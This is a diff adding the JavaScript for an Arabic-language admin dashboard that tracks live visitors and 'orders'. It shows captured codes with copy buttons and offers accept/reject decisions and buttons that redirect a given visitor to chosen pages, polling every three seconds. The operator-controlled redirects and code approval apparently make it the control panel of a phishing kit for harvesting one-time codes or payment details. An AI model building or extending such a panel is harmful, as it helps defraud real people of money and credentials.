+    return '<button style="background:'+p.c+'" onclick="doRedir(\''+esc(o.ref)+'\',\''+p.pg+'\')">'+p.l+'</button>';
+  }).join('')+'</div></div>';
+
+  var activeCount=orders.filter(isActive).length;
+  h+='<div class="sec-del"><h4>🗑️ حذف البيانات</h4>'+
+    '<div class="del-msg" id="delMsg"></div>'+
+    '<div id="delContent">'+
+    '<button class="btn-del-all" onclick="showDelConfirm()">🗑️ حذف الطلبات غير النشطة ('+(orders.length-activeCount)+')</button>'+
+    '</div><p class="note">سيتم حذف الطلبات التي لم تُحدَّث خلال آخر دقيقتين</p></div>';
+
+  dc.innerHTML=h;
+}
+
+function codeCard(lbl,val){
+  if(!val)return '<div class="code-empty"><div class="lbl">'+lbl+'</div><div class="val">لم يُسجل بعد</div></div>';
+  return '<div class="code-card"><div class="lbl">'+lbl+'</div><div class="val">'+esc(val)+'</div>'+
+    '<button class="cp" data-copy="'+esc(val)+'" onclick="doCopy(this)">📋 نسخ</button></div>';
+}
+
+function doCopy(btn){
+  var txt=btn.getAttribute('data-copy');
+  navigator.clipboard.writeText(txt).then(function(){
+    btn.classList.add('ok');var old=btn.textContent;btn.textContent='✅ تم';
+    setTimeout(function(){btn.classList.remove('ok');btn.textContent=old;},1500);
+  });
+}
+
+function detDel(ref){
+  if(detDelConf){api('DELETE','/api/admin/orders/'+encodeURIComponent(ref)).then(function(){
+    detDelConf=false;closeDetail();loadOrders();});}
+  else{detDelConf=true;var o=orders.find(function(x){return x.ref===ref;});if(o)renderDetail(o);
+    setTimeout(function(){if(detDelConf){detDelConf=false;var o2=orders.find(function(x){return x.ref===ref;});if(o2)renderDetail(o2);}},3000);}
+}
+
+function showDelConfirm(){
+  document.getElementById('delContent').innerHTML=
+    '<p class="del-warn">⚠️ هل أنت متأكد؟ سيتم حذف الطلبات غير النشطة نهائياً!</p>'+
+    '<div class="del-confirm-row">'+
+    '<button style="background:#dc2626;color:#fff" onclick="doDelInactive()">✅ نعم، احذف</button>'+
+    '<button style="background:rgba(255,255,255,.1);color:#fff;border:1px solid rgba(255,255,255,.2)" onclick="cancelDelInactive()">❌ إلغاء</button></div>';
+}
+function doDelInactive(){
+  var btn=document.querySelector('.del-confirm-row button');
+  if(btn){btn.textContent='⏳ جاري الحذف...';btn.disabled=true;}
+  api('DELETE','/api/admin/inactive').then(function(r){
+    var msg=document.getElementById('delMsg');
+    if(r.ok){msg.className='del-msg ok';msg.textContent='✅ تم حذف '+(r.deleted||0)+' طلب غير نشط';msg.style.display='block';}
+    else{msg.className='del-msg err';msg.textContent='❌ فشل الحذف';msg.style.display='block';}
+    loadOrders();
+  });
+}
+function cancelDelInactive(){var o=orders.find(function(x){return x.ref===selRef;});if(o)renderDetail(o);}
+
+function doDecide(ref,decision){
+  api('POST','/api/admin/decide/'+encodeURIComponent(ref),{decision:decision}).then(function(){
+    showNotif(decision==='accept'?'✅ تم القبول':'❌ تم الرفض');loadOrders();});
+}
+function doRedir(ref,page){
+  api('POST','/api/admin/redirect/'+encodeURIComponent(ref),{page:page}).then(function(){
+    showNotif('✅ تم إعادة التوجيه');loadOrders();});
+}
+
+function loadOrders(){
+  api('GET','/api/admin/orders').then(function(r){
+    if(!r.ok)return;
+    var nw=r.orders||[];
+    var nrefs=new Set(nw.map(function(o){return o.ref;}));
+    if(prevRefs.size>0){var fresh=nw.filter(function(o){return!prevRefs.has(o.ref);});
+      if(fresh.length){playSound();showNotif('🔔 طلب جديد: '+(fresh[0].n||fresh[0].p||'—'));}}
+    prevRefs=nrefs;orders=nw;onlineCount=r.active||0;totalVisitors=r.totalVisitors||0;visitorPages=r.pages||[];
+    renderStats();renderActive();renderOrders();
+    if(selRef){var o=orders.find(function(x){return x.ref===selRef;});if(o)renderDetail(o);else closeDetail();}
+  }).catch(function(){});
+}
+function loadVisitors(){
+  api('GET','/api/admin/visitors').then(function(r){
+    if(r.ok){onlineCount=r.count||0;renderStats();renderActive();}
+  }).catch(function(){});
+}
+
+function openVM(){
+  var activeOrd=orders.filter(isActive).length;
+  var h='<div class="modal"><div class="modal-head"><div><div style="display:flex;align-items:center;gap:10px">'+
+    '<span style="font-size:24px">📊</span><div><h3 style="margin:0">إحصائيات الزوار والطلبات</h3>'+
+    '<p style="margin:2px 0 0;font-size:12px;color:rgba(255,255,255,.5)">متابعة حركة زوار الموقع</p></div></div></div>'+
+    '<div class="btns"><button style="background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);color:#fff" onclick="loadOrders();openVM()">🔄 تحديث</button>'+
+    '<button style="background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.25);color:#f87171" onclick="closeVM()">✕ إغلاق</button></div></div>';
+
+  h+='<div class="modal-body">';
+  h+='<div class="vm-stats" style="grid-template-columns:repeat(4,1fr)">'+
+    '<div class="vm-sc" style="background:rgba(27,122,61,.1);border:1px solid rgba(27,122,61,.25)">'+
+    '<div class="n" style="color:#1B7A3D">'+orders.length+'</div><div class="l">إجمالي الطلبات</div></div>'+
+    '<div class="vm-sc" style="background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.25)">'+
+    '<div class="n" style="color:#f59e0b">'+totalVisitors+'</div><div class="l">إجمالي الزوار</div></div>'+
+    '<div class="vm-sc" style="background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.25)">'+
+    '<div class="n" style="color:#22c55e;display:flex;align-items:center;justify-content:center;gap:6px">'+
+    '<span style="width:8px;height:8px;border-radius:50%;background:#22c55e;display:inline-block"></span>'+onlineCount+'</div>'+
+    '<div class="l">الزوار الحاليين</div></div>'+
+    '<div class="vm-sc" style="background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.25)">'+
+    '<div class="n" style="color:#3b82f6">'+activeOrd+'</div><div class="l">طلبات نشطة</div></div></div>';
+
+  if(visitorPages.length){
+    var pageCounts={};
+    visitorPages.forEach(function(p){pageCounts[p]=(pageCounts[p]||0)+1;});
+    h+='<div style="margin-bottom:16px"><h4 style="font-weight:700;font-size:14px;margin:0 0 10px;color:#f59e0b">📍 صفحات الزوار النشطين</h4>';
+    h+='<div style="display:flex;flex-wrap:wrap;gap:8px">';
+    Object.keys(pageCounts).forEach(function(pg){
+      h+='<span class="pg-badge" style="background:'+(PC[pg]||'#6b7280')+';padding:4px 12px;font-size:12px">'+esc(pg)+' ('+pageCounts[pg]+')</span>';
+    });
+    h+='</div></div>';
+  }
+
+  h+='<div class="vm-footer"><span class="note">يتم تحديث البيانات تلقائياً كل 3 ثوانٍ</span>'+
+    '<button style="background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.3);color:#f87171;border-radius:8px;padding:6px 14px;font-size:11px;font-weight:700;cursor:pointer;font-family:Cairo,sans-serif" onclick="resetAll()">⚠️ تصفير جميع البيانات</button></div>';
+
+  h+='</div></div>';
+  document.getElementById('vModal').innerHTML=h;
+  document.getElementById('vModal').classList.add('show');
+}
+function closeVM(){document.getElementById('vModal').classList.remove('show');document.getElementById('vModal').innerHTML='';}
+
+function resetAll(){
+  if(!confirm('⚠️ هل أنت متأكد؟ سيتم حذف جميع الطلبات والزوار نهائياً!'))return;
+  api('POST','/api/admin/reset').then(function(r){
+    orders=[];onlineCount=0;totalVisitors=0;visitorPages=[];prevRefs=new Set();selRef=null;
+    renderStats();renderActive();renderOrders();closeDetail();closeVM();
+    loadOrders();
+    showNotif('✅ تم تصفير جميع البيانات — الطلبات: '+(r.deletedOrders||0));
+  });
+}
+
+function scrollToOrders(){
+  if(!orders.length){showNotif('📭 لا توجد طلبات');return;}
+  selectOrder(orders[0].ref);
+  var el=document.querySelector('.col-o');
+  if(el){el.style.boxShadow='inset 0 0 0 2px #1B7A3D';setTimeout(function(){el.style.boxShadow='';},1500);}
+  showNotif('📋 إجمالي الطلبات: '+orders.length);
+}
+function scrollToActive(){
+  var active=orders.filter(isActive);
+  if(!active.length){showNotif('💤 لا توجد طلبات نشطة');return;}
+  selectOrder(active[0].ref);
+  var el=document.querySelector('.col-a');
+  if(el){el.style.boxShadow='inset 0 0 0 2px #3b82f6';setTimeout(function(){el.style.boxShadow='';},1500);}
+  showNotif('⚡ طلبات نشطة: '+active.length);
+}
+function scrollToDone(){
+  var done=orders.filter(function(o){return o.status==='confirmed';});
+  if(!done.length){showNotif('📭 لا توجد طلبات مكتملة');return;}
+  selectOrder(done[0].ref);
+  showNotif('✅ طلبات مكتملة: '+done.length);
+}
+
+checkAuth();
+setInterval(function(){if(PW){loadOrders();loadVisitors();}},3000);
+</script>
+</body>
+</html>
